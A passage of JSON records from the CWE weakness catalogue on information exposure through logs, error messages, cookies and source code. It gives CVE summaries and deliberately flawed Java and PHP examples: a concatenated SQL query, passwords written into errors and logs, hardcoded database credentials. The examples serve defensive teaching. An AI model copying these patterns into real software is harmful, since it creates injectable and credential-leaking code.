{"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic BankAccount getUserBankAccount(String username, String accountNumber) {\n\t\t\tBankAccount userAccount = null;\n\t\t\tString query = null;\n\t\t\ttry {\n\t\t\t\tif (isAuthorizedUser(username)) {\n\t\t\t\t\tquery = \"SELECT * FROM accounts WHERE owner = \"\n\t\t\t\t\t+ username + \" AND accountID = \" + accountNumber;\n\t\t\t\t\tDatabaseManager dbManager = new DatabaseManager();\n\t\t\t\t\tConnection conn = dbManager.getConnection();\n\t\t\t\t\tStatement stmt = conn.createStatement();\n\t\t\t\t\tResultSet queryResult = stmt.executeQuery(query);\n\t\t\t\t\tuserAccount = (BankAccount)queryResult.getObject(accountNumber);\n\t\t\t\t}\n\t\t\t} catch (SQLException ex) {\n\t\t\t\tString logMessage = \"Unable to retrieve account information from database,\\nquery: \" + query;\n\t\t\t\tLogger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);\n\t\t\t}\n\t\t\treturn userAccount;\n\t}\n```"}, {"BodyText": "The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database."}]}], "ObservedExamples": [{"Reference": "CVE-2017-9615", "Description": "verbose logging stores admin credentials in a world-readable log file", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-9615"}, {"Reference": "CVE-2018-1999036", "Description": "SSH password for private key stored in build log", "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1999036"}], "RelatedAttackPatterns": ["215"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-23506", "Description": "Spinnaker is an open source, multi-cloud continuous delivery platform for releasing software changes, and Spinnaker's Rosco microservice produces machine images. Rosco prior to versions 1.29.2, 1.28.4, and 1.27.3 does not property mask secrets generated via packer builds. This can lead to exposure of sensitive AWS credentials in packer log files. Versions 1.29.2, 1.28.4, and 1.27.3 of Rosco contain fixes for this issue. A workaround is available. It's recommended to use short lived credentials via role assumption and IAM profiles. Additionally, credentials can be set in `/home/spinnaker/.aws/credentials` and `/home/spinnaker/.aws/config` as a volume mount for Rosco pods vs. setting credentials in roscos bake config properties. Last even with those it's recommend to use IAM Roles vs. long lived credentials. This drastically mitigates the risk of credentials exposure. If users have used static credentials, it's recommended to purge any bake logs for AWS, evaluate whether AWS_ACCESS_KEY, SECRET_KEY and/or other sensitive data has been introduced in log files and bake job logs. Then, rotate these credentials and evaluate potential improper use of those credentials."}, {"Reference": "CVE-2021-3684", "Description": "A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user."}, {"Reference": "CVE-2022-0021", "Description": "An information exposure through log file vulnerability exists in the Palo Alto Networks GlobalProtect app on Windows that logs the cleartext credentials of the connecting GlobalProtect user when authenticating using Connect Before Logon feature. This issue impacts GlobalProtect App 5.2 versions earlier than 5.2.9 on Windows. This issue does not affect the GlobalProtect app on other platforms."}, {"Reference": "CVE-2022-0652", "Description": "Confd log files contain local users', including root\u2019s, SHA512crypt password hashes with insecure access permissions. This allows a local attacker to attempt off-line brute-force attacks against these password hashes in Sophos UTM before version 9.710."}, {"Reference": "CVE-2022-0718", "Description": "A flaw was found in python-oslo-utils. Due to improper parsing, passwords with a double quote ( \" ) in them cause incorrect masking in debug logs, causing any part of the password after the double quote to be plaintext."}, {"Reference": "CVE-2022-0725", "Description": "A flaw was found in keepass. The vulnerability occurs due to logging the plain text passwords in system log and leads to an Information Exposure vulnerability. This flaw allows an attacker to interact and read sensitive passwords and logs."}, {"Reference": "CVE-2022-20630", "Description": "A vulnerability in the audit log of Cisco DNA Center could allow an authenticated, local attacker to view sensitive information in clear text. This vulnerability is due to the unsecured logging of sensitive information on an affected system. An attacker with administrative privileges could exploit this vulnerability by accessing the audit logs through the CLI. A successful exploit could allow the attacker to retrieve sensitive information that includes user credentials."}, {"Reference": "CVE-2022-31047", "Description": "TYPO3 is an open source web content management system. Prior to versions 7.6.57 ELTS, 8.7.47 ELTS, 9.5.34 ELTS, 10.4.29, and 11.5.11, system internal credentials or keys (e.g. database credentials) can be logged as plaintext in exception handlers, when logging the complete exception stack trace. TYPO3 versions 7.6.57 ELTS, 8.7.47 ELTS, 9.5.34 ELTS, 10.4.29, 11.5.11 contain a fix for the problem."}, {"Reference": "CVE-2022-33737", "Description": "The OpenVPN Access Server installer creates a log file readable for everyone, which from version 2.10.0 and before 2.11.0 may contain a random generated admin password"}, {"Reference": "CVE-2022-34826", "Description": "In Couchbase Server 7.1.x before 7.1.1, an encrypted Private Key passphrase may be leaked in the logs."}, {"Reference": "CVE-2022-20458", "Description": "The logs of sensitive information (PII) or hardware identifier should only be printed in Android \"userdebug\" or \"eng\" build. StatusBarNotification.getKey() could contain sensitive information. However, CarNotificationListener.java, it prints out the StatusBarNotification.getKey() directly in logs, which could contain user's account name (i.e. PII), in Android \"user\" build.Product: AndroidVersions: Android-12LAndroid ID: A-205567776"}, {"Reference": "CVE-2022-20651", "Description": "A vulnerability in the logging component of Cisco Adaptive Security Device Manager (ASDM) could allow an authenticated, local attacker to view sensitive information in clear text on an affected system. Cisco ADSM must be deployed in a shared workstation environment for this issue to be exploited. This vulnerability is due to the storage of unencrypted credentials in certain logs. An attacker could exploit this vulnerability by accessing the logs on an affected system. A successful exploit could allow the attacker to view the credentials of other users of the shared device."}, {"Reference": "CVE-2022-31098", "Description": "Weave GitOps is a simple open source developer platform for people who want cloud native applications, without needing Kubernetes expertise. A vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster. This vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters. A successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters. This vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version v0.8.1-rc.6 or newer. There is no known workaround for this vulnerability."}, {"Reference": "CVE-2022-0338", "Description": "Insertion of Sensitive Information into Log File in Conda loguru prior to 0.5.3. "}, {"Reference": "CVE-2021-39715", "Description": "In __show_regs of process.c, there is a possible leak of kernel memory and addresses due to log information disclosure. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-178379135References: Upstream kernel"}, {"Reference": "CVE-2022-29869", "Description": "cifs-utils through 6.14, with verbose logging, can cause an information leak when a file contains = (equal sign) characters but is not a valid credentials file."}, {"Reference": "CVE-2022-3018", "Description": "An information disclosure vulnerability in GitLab CE/EE affecting all versions starting from 9.3 before 15.2.5, all versions starting from 15.3 before 15.3.4, all versions starting from 15.4 before 15.4.1 allows a project maintainer to access the DataDog integration API key from webhook logs."}, {"Reference": "CVE-2022-34570", "Description": "WAVLINK WN579 X3 M79X3.V5030.191012/M79X3.V5030.191012 contains an information leak which allows attackers to obtain the key information via accessing the messages.txt page."}, {"Reference": "CVE-2022-2394", "Description": "Puppet Bolt prior to version 3.24.0 will print sensitive parameters when planning a run resulting in them potentially being logged when run programmatically, such as via Puppet Enterprise."}, {"Reference": "CVE-2022-24414", "Description": "Dell EMC CloudLink 7.1.3 and all earlier versions, Auth Token is exposed in GET requests. These request parameters can get logged in reverse proxies and server logs. Attackers may potentially use these tokens to access CloudLink server. Tokens should not be used in request URL to avoid such attacks."}, {"Reference": "CVE-2022-25823", "Description": "Information Exposure vulnerability in Galaxy Watch Plugin prior to version 2.2.05.220126741 allows attackers to access user information in log."}, {"Reference": "CVE-2022-25826", "Description": "Information Exposure vulnerability in Galaxy S3 Plugin prior to version 2.2.03.22012751 allows attacker to access password information of connected WiFiAp in the log"}, {"Reference": "CVE-2022-25827", "Description": "Information Exposure vulnerability in Galaxy Watch Plugin prior to version 2.2.05.22012751 allows attacker to access password information of connected WiFiAp in the log"}, {"Reference": "CVE-2022-25828", "Description": "Information Exposure vulnerability in Watch Active Plugin prior to version 2.2.07.22012751 allows attacker to access password information of connected WiFiAp in the log"}, {"Reference": "CVE-2022-25829", "Description": "Information Exposure vulnerability in Watch Active2 Plugin prior to version 2.2.08.22012751 allows attacker to access password information of connected WiFiAp in the log"}, {"Reference": "CVE-2022-25830", "Description": "Information Exposure vulnerability in Galaxy Watch3 Plugin prior to version 2.2.09.22012751 allows attacker to access password information of connected WiFiAp in the log"}, {"Reference": "CVE-2022-27192", "Description": "The Reporting module in Aseco Lietuva document management system DVS Avilys before 3.5.58 allows unauthorized file download. An unauthenticated attacker can impersonate an administrator by reading administrative files."}, {"Reference": "CVE-2022-29071", "Description": "This advisory documents an internally found vulnerability in the on premises deployment model of Arista CloudVision Portal (CVP) where under a certain set of conditions, user passwords can be leaked in the Audit and System logs. The impact of this vulnerability is that the CVP user login passwords might be leaked to other authenticated users."}, {"Reference": "CVE-2022-39043", "Description": "Juiker app stores debug logs which contains sensitive information to mobile external storage. An unauthenticated physical attacker can access these files to acquire partial user information such as personal contacts."}, {"Reference": "CVE-2022-42439", "Description": " IBM App Connect Enterprise 11.0.0.17 through 11.0.0.19 and 12.0.4.0 and 12.0.5.0 contains an unspecified vulnerability in the Discovery Connector nodes which may cause a 3rd party system\u2019s credentials to be exposed to a privileged attacker. IBM X-Force ID: 238211. "}]}
{"ID": "533", "Name": "DEPRECATED: Information Exposure Through Server Log Files", "Abstraction": "Variant", "Structure": "Simple", "Status": "Deprecated", "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "534", "Name": "DEPRECATED: Information Exposure Through Debug Log Files", "Abstraction": "Variant", "Structure": "Simple", "Status": "Deprecated", "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "535", "Name": "Exposure of Information Through Shell Error Message", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "211", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "536", "Name": "Servlet Runtime Error Message Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "211", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "The error message may contain the location of the file in which the offending function is located. This may disclose the web root's absolute path as well as give the attacker the location of application files or configuration information. It may even disclose the portion of code that failed. In many cases, an attacker can use the data to launch further attacks against the system."}], "DemonstrativeExamples": [{"ID": "DX-190", "Entries": [{"IntroText": "The following servlet code does not catch runtime exceptions, meaning that if such an exception were to occur, the container may display potentially dangerous information (such as a full stack trace)."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\tString username = request.getParameter(\"username\");\n```\n// May cause unchecked NullPointerException.* \n\t\t\tif (username.length() < 10) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "537", "Name": "Java Runtime Error Message Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "211", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Do not expose sensitive error information to the user."}], "DemonstrativeExamples": [{"ID": "DX-191", "Entries": [{"IntroText": "In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class InputFileRead {\n\t\t\tprivate File readFile = null;\n\t\t\tprivate FileReader reader = null;\n\t\t\tprivate String inputFilePath = null;\n\t\t\tprivate final String DEFAULT_FILE_PATH = \"c:\\\\somedirectory\\\\\";\n\t\t\tpublic InputFileRead() {\n\t\t\t\tinputFilePath = DEFAULT_FILE_PATH;\n\t\t\t}\n\t\t\tpublic void setInputFile(String inputFile) {\n```\n/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */* \n\t\t\t\t\t}\n\t\t\t\n\t\t\tpublic void readInputFile() {\n\t\t\t```\n\t\t\t\t\ttry {\n\t\t\t\t\t\treader = new FileReader(readFile);\n\t\t\t\t\t\t...\n\t\t\t\t\t} catch (RuntimeException rex) {\n\t\t\t\t\t\tSystem.err.println(\"Error: Cannot open input file in the directory \" + inputFilePath);\n\t\t\t\t\t\tSystem.err.println(\"Input file has not been set, call setInputFile method before calling readInputFile\");\n\t\t\t\t\t} catch (FileNotFoundException ex) {...}\n\t\t\t}\n\t}\n```"}, {"BodyText": "However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user."}]}, {"Entries": [{"IntroText": "In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class BankManagerLoginServlet extends HttpServlet {\n\t\t\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t\t\ttry {\n```\n// Get username and password from login page request* \n\t\t\t\t\t\t\tString username = request.getParameter(\"username\");\n\t\t\t\t\t\t\tString password = request.getParameter(\"password\");\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t *// Authenticate user* \n\t\t\t\t\t\t\tBankManager bankMgr = new BankManager();\n\t\t\t\t\t\t\tboolean isAuthentic = bankMgr.authenticateUser(username, password);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t *// If user is authenticated then go to successful login page* \n\t\t\t\t\t\t\tif (isAuthentic) {\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\trequest.setAttribute(\"login\", new String(\"Login Successful.\"));\n\t\t\t\t\t\t\t\tgetServletContext().getRequestDispatcher(\"/BankManagerServiceLoggedIn.jsp\"). forward(request, response);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n```\n// Otherwise, raise failed login exception and output unsuccessful login message to error page* \n\t\t\t\t\t\t\t\t\tthrow new FailedLoginException(\"Failed Login for user \" + username + \" with password \" + password);}} catch (FailedLoginException ex) {\n\t\t\t\t\t```\n```\n// output failed login message to error page* \n\t\t\t\t\t\t\trequest.setAttribute(\"error\", new String(\"Login Error\"));\n\t\t\t\t\t\t\trequest.setAttribute(\"message\", ex.getMessage());\n\t\t\t\t\t\t\tgetServletContext().getRequestDispatcher(\"/ErrorPage.jsp\").forward(request, response);}}"}, {"BodyText": "However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "538", "Name": "Insertion of Sensitive Information into Externally-Accessible File or Directory", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "200", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Operation", "System Configuration"], "Description": "Do not expose file and directory information to the user."}], "DemonstrativeExamples": [{"ID": "DX-179", "Entries": [{"IntroText": "In the following code snippet, a user's full name and credit card number are written to a log file."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tlogger.info(\"Username: \" + usernme + \", CCN: \" + ccn);\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2018-1999036", "Description": "SSH password for private key stored in build log", "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1999036"}], "RelatedAttackPatterns": ["95"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness."}, {"Type": "Maintenance", "Note": "There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category."}], "Top25Examples": [{"Reference": "CVE-2021-40363", "Description": "A vulnerability has been identified in SIMATIC PCS 7 V8.2 (All versions), SIMATIC PCS 7 V9.0 (All versions), SIMATIC PCS 7 V9.1 (All versions < V9.1 SP1), SIMATIC WinCC V15 and earlier (All versions < V15 SP1 Update 7), SIMATIC WinCC V16 (All versions < V16 Update 5), SIMATIC WinCC V17 (All versions < V17 Update 2), SIMATIC WinCC V17 (All versions <= V17 Update 4), SIMATIC WinCC V7.4 (All versions < V7.4 SP1 Update 19), SIMATIC WinCC V7.5 (All versions < V7.5 SP2 Update 6). The affected component stores the credentials of a local system account in a potentially publicly accessible project file using an outdated cipher algorithm. An attacker may use this to brute force the credentials and take over the system."}, {"Reference": "CVE-2022-27195", "Description": "Jenkins Parameterized Trigger Plugin 2.43 and earlier captures environment variables passed to builds triggered using Jenkins Parameterized Trigger Plugin, including password parameter values, in their `build.xml` files. These values are stored unencrypted and can be viewed by users with access to the Jenkins controller file system."}, {"Reference": "CVE-2022-0013", "Description": "A file information exposure vulnerability exists in the Palo Alto Networks Cortex XDR agent that enables a local attacker to read the contents of arbitrary files on the system with elevated privileges when generating a support file. This issue impacts: Cortex XDR agent 5.0 versions earlier than Cortex XDR agent 5.0.12; Cortex XDR agent 6.1 versions earlier than Cortex XDR agent 6.1.9; Cortex XDR agent 7.2 versions earlier than Cortex XDR agent 7.2.4; Cortex XDR agent 7.3 versions earlier than Cortex XDR agent 7.3.2."}, {"Reference": "CVE-2022-24782", "Description": "Discourse is an open source discussion platform. Versions 2.8.2 and prior in the `stable` branch, 2.9.0.beta3 and prior in the `beta` branch, and 2.9.0.beta3 and prior in the `tests-passed` branch are vulnerable to a data leak. Users can request an export of their own activity. Sometimes, due to category settings, they may have category membership for a secure category. The name of this secure category is shown to the user in the export. The same thing occurs when the user's post has been moved to a secure category. A patch for this issue is available in the `main` branch of Discourse's GitHub repository and is anticipated to be part of future releases."}]}
{"ID": "539", "Name": "Use of Persistent Cookies Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The web application uses persistent cookies, but the cookies contain sensitive information.", "ExtendedDescription": "Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory and are not stored anywhere, but persistent cookies are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Do not store sensitive information in persistent cookies."}], "RelatedAttackPatterns": ["21", "31", "39", "59", "60"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "54", "Name": "Path Equivalence: 'filedir\\' (Trailing Backslash)", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of trailing backslash ('filedir\\') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "162", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2004-0847", "Description": "web framework for .NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) \"\\\" (backslash) or (2) \"%5C\" (encoded backslash)", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0847"}, {"Reference": "CVE-2004-0061", "Description": "Bypass directory access restrictions using trailing dot in URL", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0061"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "540", "Name": "Inclusion of Sensitive Information in Source Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.", "ExtendedDescription": "There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "538", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "System Configuration"], "Description": "Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet."}], "DemonstrativeExamples": [{"ID": "DX-104", "Entries": [{"IntroText": "The following code uses an include file to store database credentials:"}, {"BodyText": "database.inc"}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t<?php\n\t$dbName = 'usersDB';\n\t$dbPassword = 'skjdh#67nkjd3$3$';\n\t?>\n```"}, {"BodyText": "login.php"}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t<?php\n\tinclude('database.inc');\n\t$db = connectToDB($dbName, $dbPassword);\n\t$db.authenticateUser($username, $password);\n\t?>\n```"}, {"BodyText": "If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."}]}, {"Entries": [{"IntroText": "The following comment, embedded in a JSP, will be displayed in the resulting HTML output."}, {"Nature": "Bad", "Language": "JSP", "ExampleCode": "```\n\t<!-- FIXME: calling this with more than 30 args kills the JDBC server -->\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2022-25512", "Description": "Server for Team Awareness Kit (TAK) application includes sensitive tokens in the JavaScript source code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25512"}, {"Reference": "CVE-2022-24867", "Description": "The LDAP password might be visible in the html code of a rendered page in an IT Asset Management tool.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24867"}, {"Reference": "CVE-2007-6197", "Description": "Version numbers and internal hostnames leaked in HTML comments.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6197"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-24867", "Description": "GLPI is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing. When you pass the config to the javascript, some entries are filtered out. The variable ldap_pass is not filtered and when you look at the source code of the rendered page, we can see the password for the root dn. Users are advised to upgrade. There is no known workaround for this issue."}, {"Reference": "CVE-2022-43959", "Description": "Insufficiently Protected Credentials in the AD/LDAP server settings in 1C-Bitrix Bitrix24 through 22.200.200 allow remote administrators to discover an AD/LDAP administrative password by reading the source code of 